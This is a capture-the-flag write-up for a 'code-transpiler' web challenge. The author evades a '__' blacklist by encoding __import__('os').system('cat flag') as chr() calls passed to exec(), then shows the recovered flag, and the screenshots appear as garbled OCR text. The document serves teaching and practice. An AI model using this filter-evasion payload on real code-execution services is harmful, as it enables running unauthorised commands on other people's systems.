# code-transpiler
> Bypass the security restriction and get th flag.

## About the Challenge
We were given a website where we can execute a python command like this


[Image extracted text: Request
Response
Pretty
Raw
Hex
0 In
=
Pretty
Raw
Hex
Render
PosT
/execute HTTP/1.1
HTTP/1.0
200
OK
2
Host:
35.242.207
48
32514
2 Content-Type:
text/html;
charset-utf-8
3 Content-Length:
203
3
Content-Length:
13
Cache-Control:
max-age-0
Server:
Werkzeug/2.0.3 Python/3.6.9
5
Upgrade-Insecure-Requests:
5
Date:
Sun,
22
Oct
2023
13:06:05
GMT
6 Origin:
http:
135.242.207.48:32514
6
Content-Type:
multipart/form-data;
Hello
World!
boundary=
~WebKitFormBoundarybwboMSSzDBvbpyFi
User-Agent
Mozilla/5.0
Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome/118 . 0.5993. 88
Safari/537
36
Accept
text/html,application/xhtml+xml,application/xml;q-0.9, image/avif_
image/webp, image/apng, */*;q-0.8,application/signed-exchange;v=b3;
q=0.7
10
Referer:
http://35.242.207.48:32514/
11
Accept-Encoding
gzip,
deflate,
br
12 Accept-Language
en-US, en;q=0.9
13
Connection:
close
14
15
WebKitFormBoundarybwboMSSzDBvbpyFi
16 Content-Disposition:
form-data;
name="file"
filename-"test.py'
17
Content-Type:
text_
/plain
18
19
print
"Hello
World
20
21
WebKitFormBoundary6wboMSSzDBvbpyFi -
22]


And there are also some limitation (For example, we can’t input `__`)


[Image extracted text: Request
Response
Pretty
Raw
Hex
0
In
=
Pretty
Raw
Hex
Render
PosT
/execute HTTP/1.1
HTTP/1.0
200
OK
2
Host:
35.242.207
48: 32514
2 Content-Type:
text/html;
charset-utf-8
3
Content-Length:
197
3 Content-Length:
24
Cache-Control:
max-age-0
Server:
Werkzeug/2.0.3 Python/3.6.9
5
Upgrade-Insecure-Requests:
5
Date:
Sun,
22
Oct
2023
13:06:50
GMT
6 Origin:
http://35.242
207
48:32514
6
Content-Type
multipart/form-data;
BLACKLIST#8:
Harder!
boundary=
~~WebKitFormBoundarybwboMSSzDBvbpyFi
User-Agent
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537.36
(KHTML,
like Gecko)
Chrome/118 . 0.5993. 88
Safari/537
36
Accept
text/html,application/xhtml+xml
application/xml;q=0.9, image/avif_
image/webp, image/apng,*/*;9=0.8,application/signed-exchange;v=b3;
q=0.7
10
Referer:
http://35.242.207.48:32514/
11
Accept-Encoding
gzip,
deflate,
br
12
Accept-Language
en-US, en;q=0.9
13
Connection:
close
14
15
WebKitFormBoundarybwboMSSzDBv6pyFi
16
Content-Disposition:
form-data;
name="file"
filename-"test.py'
17 Content-Type
text/plain
18
19
print
selfl
20
21
WebKitFormBoundarybwboMSSzDBvbpyFi--
22
Try]


## How to Solve?
In this case, we use the `exec()` function, and then I need to change each character to ASCII code and then use the `chr()` function. The command below is used to read the flag

```
__import__("os").system("cat flag") 
```

And then, the final payload will be like this

```
exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)+chr(41))
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
0 In
=
Pretty
Raw
Hex
Render
5
In
=
PosT
lexecute
HTTP/1.1
HTTP/1.0
200
OK
2
Host:
35.242.207
48:31734
2 Content-Type
text/html;
charset-utf-8
3 Content-Length:
487
3 Content-Length:
69
Cache-Control:
max-age-0
Server:
Werkzeug/2.0.3 Python/3.6.9
5
Upgrade-Insecure-Requests:
5
Date:
Sun,
22
Oct
2023
10
49:23
GMT
6 Origin: http://35.242.207
48:31734
6
Content-Type
multipart/form-data;
CTF{4e08cd8cc051a304f94dd905b66af29572e3aa8fa56d93200bfd34727e2a8
boundary=_-
~~WebKitFormBoundaryDCUfb8gowLeRZEdF
92a}
User-Agent:
Mozilla/5 .0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome
118.0.5993.88
Safari/537 _
36
Accept
text/html,application/xhtml+xml,application/xml;q=0.9, image/avif ,
image/webp, image/apng
*/*;q=0.8,application/signed-exchange;v=b3;
q=0.7
10
Referer:
http://35.242.207 _
48:31734/
11 Accept-Encoding
gzip,
deflate,
br
12 Accept-Language:
en-US, en;q-0.9
13
Connection:
close
14
15
~~WebKitFormBoundaryDCUfb8gowleRZEdF
16 Content-Disposition:
form-data;
name="file"
filename="lisss.py
17
Content-Type
text/plaind
18
19
exec (chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)
+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(1l1)+chr(115)+chr(3
4)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+c
hr(10g)+chr(40)+chr(34)+chr(9g)+chr(97)+chr(116)+chr(32)+chr(102)
+chr(108
+chr(97)+chr(103)+chr(34)+chr(41) )
20
21
~WebKitFormBoundaryDCUfb8gowleRZEdF_=
22]


```
CTF{4e08cd8cc051a304f94dd905b66af29572e3aa8fa56d93200bfd34727e2a892a}
```